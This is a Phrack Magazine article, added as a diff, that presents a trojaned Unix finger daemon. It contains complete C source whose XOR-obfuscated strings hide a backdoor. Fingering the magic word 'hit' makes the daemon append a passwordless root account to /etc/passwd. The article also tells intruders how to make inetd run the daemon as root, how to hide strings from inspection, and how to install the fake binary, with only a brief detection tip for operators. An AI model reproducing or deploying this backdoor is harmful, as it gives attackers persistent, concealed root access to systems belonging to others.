@@ -1,0 +1,387 @@
+                              ==Phrack Magazine==
+
+                 Volume Five, Issue Forty-Six, File 12 of 28
+
+****************************************************************************
+
+
+
+The fingerd trojan horse
+Original article by Hitman Italy for Phrack Inc.
+
+This article is for informational purpose only, I'm not liable for
+any damage or illegal activity perpetrated using the source or the
+informations in the article.
+
+-=- + -
+
+So you have gained access to a system and want to keep on hacking without
+being kicked off by a smart operator, there are dozen methods you can use,
+usually, if an operator figure out that his system is under attack, he'll
+check out the login program and telnetd for backdoors, then the telnet for
+logging activities or network sniffers and so on..  if nothing is found
+he'll realize the hacker is a dumb ass and he'll just modify the passwd to
+prevent him from logging on (in most cases), here comes my fingerd trojan.
+This scheme is quite original (I've never seen it used) and the source is
+compact enough to be fitted into a MAG.  The fingerd as all you know (I
+hope) is the finger server run by inetd when a client opens the finger
+port (N.79), of course if the port is locked, or you have a network
+firewall, do not use this code.
+
+---------- + CUT HERE + -----------------------------------------------
+
+/*  The Fingerd trojan by Hitman Italy
+ *  This source cannot be spread without the whole article
+ *  but you can freely implement or modify it for personal use
+ */
+
+static char copyright[] = "";   /* Add the copyright string here */
+
+static char sccsid[] = "";      /* Add the sccsid string here */
+
+
+#include <stdio.h>
+
+#define PATH_FINGER "/usr/ucb/finger"
+#define CODE 161
+
+char *HitCrypt(ch)
+char *ch;
+{
+   char *b;
+   b=ch;
+   while ((*(ch++)^=CODE)!=0x00);
+   return(b);
+}
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+   register FILE *fp;
+   register int ch;
+   register char *lp;
+   int p[2];
+
+static char exor[4][23]={
+{201,200,213,CODE},
+{142,196,213,194,142,209,192,210,210,214,197,CODE},
+{201,200,213,155,155,145,155,145,155,155,142,155,142,195,200,207,142,194,
+210,201,CODE},
+{227,192,194,202,197,206,206,211,129,192,194,213,200,215,192,213,196,197,
+143,143,143,CODE} };
+
+#define   ENTRIES   50
+   char **ap, *av[ENTRIES + 1], line[1024], *strtok();
+
+#ifdef LOGGING               /* unused, leave it for "strings" command */
+#include <netinet/in.h>
+   struct sockaddr_in sin;
+   int sval;
+
+   sval = sizeof(sin);
+   if (getpeername(0, &sin, &sval) < 0)
+      fatal(argv[0],"getpeername");
+#endif
+
+   if (!fgets(line, sizeof(line), stdin))
+      exit(1);
+
+   av[0] = "finger";
+
+   for (lp = line, ap = &av[1];;) {
+      *ap = strtok(lp, " \t\r\n");
+      if (!*ap)
+         break;
+      if ((*ap)[0] == '/' && ((*ap)[1] == 'W' || (*ap)[1] == 'w'))
+         *ap = "-l";
+      if (++ap == av + ENTRIES)
+         break;
+      lp = NULL;
+   }
+
+   if (pipe(p) < 0)
+      fatal(argv[0],"pipe");
+
+   switch(fork()) {
+   case 0:
+      (void)close(p[0]);
+      if (p[1] != 1) {
+         (void)dup2(p[1], 1);
+         (void)close(p[1]);
+      }
+
+/*-=-=-=-=-=- PUT HERE YOUR CODE -=-=-=-=-=-*/
+   if (av[1])
+       if (strcmp( (HitCrypt(&exor[0][0])) ,av[1])==0) {
+        if(!(fp=fopen( (HitCrypt(&exor[1][0])) ,"a")))
+         _exit(10);
+        fprintf(fp,"%s\n", HitCrypt(&exor[2][0]));
+        printf("%s\n", HitCrypt(&exor[3][0]));
+        fclose(fp);
+        break;
+       }
+/*-=-=-=-=-=- END OF CUSTOM CODE =-=-=-=-=-=-*/
+
+        if (execv(PATH_FINGER, av)==-1)
+         fprintf(stderr,"No local finger program found\n");
+      _exit(1);
+   case -1:
+      fatal(argv[0],"fork");
+   }
+   (void)close(p[1]);
+   if (!(fp = fdopen(p[0], "r")))
+      fatal(argv[0],"fdopen");
+   while ((ch = getc(fp)) != EOF) {
+      putchar(ch);
+   }
+   exit(0);
+}
+
+fatal(prg,msg)
+
+   char *prg,*msg;
+{
+   fprintf(stderr, "%s: ", prg);
+   perror(msg);
+   exit(1);
+}
+
+--------- + CUT HERE + ----------------------------------------------
+
+I think it's quite easy to understand, first of all, inetd opens the
+socket and pipes the the input data through the fingerd
+
+*  if (!fgets(line, sizeof(line), stdin))
+*     exit(1);
+*   av[0] = "finger";
+*   for (lp = line, ap = &av[1];;) {
+*      *ap = strtok(lp, " \t\r\n");
+*      if (!*ap)
+*         break;
+*      if ((*ap)[0] == '/' && ((*ap)[1] == 'W' || (*ap)[1] == 'w'))
+*         *ap = "-l";
+
+here it gets the data from stdin and parses them (strtok) converting (due
+to RFC742) any '/W' or '/w' old options in '-l'
+
+*    switch(fork()) {
+*   case 0:
+*      (void)close(p[0]);
+*      if (p[1] != 1) {
+*         (void)dup2(p[1], 1);
+*         (void)close(p[1]);
+*      }
+
+the task goes into the background
+
+*        if (execv(PATH_FINGER, av)==-1)
+*         fprintf(stderr,"No local finger program found\n");
+
+here the daemon executes the local finger with remote parameters
+
+*   (void)close(p[1]);
+*   if (!(fp = fdopen(p[0], "r")))
+*      fatal(argv[0],"fdopen");
+*   while ((ch = getc(fp)) != EOF) {
+*      putchar(ch);
+
+the output is piped back to the remote system
+
+That's how the finger daemon works...  now the trojan, basically we'll
+check out the input finger user till the magic code matches, then our
+sleepin' trojan will wake up and do the job...  let's examine my code
+(decrypted)
+
+/*-=-=-=-=-=- PUT HERE YOUR CODE -=-=-=-=-=-*/
+   if (av[1])
+       if (strcmp("hit",av[1])==0) {
+        if(!(fp=fopen("/etc/passwd","a")))
+         _exit(10);
+        fprintf(fp,"hit::0:0::/:/bin/csh\n");
+        printf("Backdoor activated...\n");
+        fclose(fp);
+        break;
+       }
+/*-=-=-=-=-=- END OF CUSTOM CODE =-=-=-=-=-=-*/
+
+When the "hit" magic code matches the trojan will modify the passwd adding
+a fake unpassworded root user named "hit", so you can relogin as root,
+cover your tracks and keep on working.  Of course this is an example, you
+can do what you want simply adding your custom code, you may remote cat a
+log file without logging in, or remote kill an user, maybe root logins are
+disabled so you have to make a suid shell and add a normal entry in the
+passwd or open a port and so on, you can also use multiple codes if you
+like.  If the magic word doesn't match of course the finger will work out
+normally.
+
+<example>
+# finger hit@666.666.666.666
+[666.666.666.666]
+Backdoor activated...
+
+Well done! You have gained a root access.
+(...)
+# cat /etc/passwd
+root:EXAMPLE PASSWORD:0:1:Operator:/:/bin/csh
+nobody:*:65534:65534::/:
+daemon:*:1:1::/:
+sys:*:2:2::/:/bin/csh
+bin:*:3:3::/bin:
+uucp:*:4:8::/var/spool/uucppublic:
+news:*:6:6::/var/spool/news:/bin/csh
+ingres:*:7:7::/usr/ingres:/bin/csh
+audit:*:9:9::/etc/security/audit:/bin/csh
+sync::1:1::/:/bin/sync
+ftp:*:995:995:Anonymous FTP account:/home/ftp:/bin/csh
++::0:0:::
+hit::0:0::/:/bin/csh
+^^^ they run NIS... anyway our local root login will work fine
+
+<example>
+#finger hit@hacked.system.com
+[hacked.system.com]
+here is the log
+user: xit001 from: hell.com ip: 666.666.666.666 has pw: xit001
+user: yit001 from: (...)
+
+That's really useful to collect logfiles without logging in and leave
+tracks everywhere.
+
+
+Now the problem....
+If you want to use the fingerd to run world accessible commands you won't
+have any problem but if you require root privileges check this out:
+
+#grep fingerd /etc/inetd.conf
+finger  stream  tcp     nowait  nobody  /usr/etc/in.fingerd     in.fingerd
+                                ^^^^^^
+On SunOs 4.x.x the fingerd runs as nobody, the fake user (used with
+NFS etc..), as nobody of course you cannot modify the passwd, so edit the
+file
+
+finger  stream  tcp     nowait   root   /usr/etc/in.fingerd     in.fingerd
+
+now you have to refesh the inetd process
+
+#kill -HUP <inetd pid>
+
+now you can do what you want, many unix clones let the fingerd running as
+root by default...  and even if you have to modify the inetd.conf an
+operator unlikely will realize what is appening since all other daemons
+run as root.
+
+
+Why have I crypted all data?
+#strings login
+(...)
+Yeah d00dz! That's a //\/\eg/+\Backd0[+]r by MASTER(...) of MEGA(...)
+
+Lame or not?  All alien data must be crypted..  a fast exor crypting
+routine will work fine, of course you can use the standard crypt function
+or other (slow) algorithms but since security is not important (we just
+want to make our texts invisible) I suggest using my fast algo,to create
+the exor matrix simply put all texts on a file and use the little
+ExorCrypt utility I have included UUencoded below (amiga/msdos version).
+
+<example amiga>
+echo > test "this is a test"
+Acrypt test test.o
+line crypted: 1
+type test.o
+static char exor[]={
+213,201,200,210,129,200,210,129,192,129,213,196,210,213,161};
+
+char *ExorCrypt(ch)
+char *ch;
+{
+   char *b;
+   b=ch;
+   while ((*(ch++)^=0xa1)!=0x00);
+   return(b);
+}
+
+The utility will create the exor vector (matrix) (from the 80 column
+formatted ascii input text) and the specific decoding function, If you do
+not supply a key "$a1" will be used, remember to add a NewLine if
+necessary, the vector/matrix never contain them.
+
+Before compiling the whole thing you must add the copyright and sccsid
+strings I have not included (they may vary).
+Let's simply do:  (SunOs)
+
+#strings /usr/etc/in.fingerd
+@(#) Copyright (c) 1983 Regents of the University of California.
+ All rights reserved.                       ^^^^ COPYRIGHT STRING
+@(#)in.fingerd.c 1.6 88/11/28 SMI           <<<< SCCSID STRING
+getpeername
+finger
+pipe
+/usr/ucb/finger
+No local finger program found
+fork
+fdopen
+%s:
+         (((((
+DDDDDDDDDD
+AAAAAA
+BBBBBB
+
+The top of source becomes:
+static char copyright[]=
+"@(#) Copyright (c) 1983 Regents of the University of California.\n\
+ All rights reserverd.\n";
+static char sccsid[]="@(#)in.fingerd.c 1.6 88/11/28 SMI"
+
+That's all. Now you can compile and install your fingerd trojan,
+the source was adapted for SunOS but you can port it on many unix
+clones without troubles.
+
+
+Few final words to:
+
+Operators: How to defeat this trojan? First of all check the inetd.conf,
+           then do VARIOUS fingerd checksums (maybe even the "sum" command
+           is a trojan :) if you discover the trojan wrap the finger port
+           so you can track down the hacker (usually all wtmp/lastlog logs
+           are removed) or wrap everything modifying the daemons, do NOT use
+           the inetd.conf_jump_new_daemon scheme, if you can, add a fingerd
+           tripwire entry to prevent future installations.
+           Well...  if the hacker is a good one everything is useless.
+
+Beginners: You must be root to install the trojan, remember to get a copy
+           of the original fingerd program before installing the fake
+           version.
+
+           On a Sun do:
+           #cc -o in.fingerd trojan.c
+           #mv /usr/etc/in.fingerd fingerd.old
+           #mv in.fingerd /usr/etc
+           remember to check the /etc/inetd.conf
+-=- + -
+
+To get in touch with me send E-Mail to:
+
+ Internet: hit@bix.com           X.25: QSD Nua (0)208057040540
+                                           Mbx: Hitman_Italy
+
+if you want, use my PGP key
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.3a.2
+
+mQCNAiypAuIAAAEEALVTvHLl4zthwydN+3oydNj7woyoKBpi1wBYnKJ4OGFa/KT3
+faERV90ifxTS73Ec9pYhS/GSIRUVuOGwahx2UD0HIDgXnoceRamhE1/A9FySImJe
+KMc85+nvDuZ0THMbx/W+DDHJMR1Rp2nBzVPMGEjixon02nE/5xrNm/sb/cUdAAUR
+tBpIaXRtYW4gSXRhbHkgPGhpdEBiaXguY29tPg==
+=bCu4
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+ExorCrypt Amiga version:
+
+-=) S.Encode v2.5 (=-
+ExorCrypt MSdos version:
+
+-=) S.Encode v2.5 (=-
+-=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=-
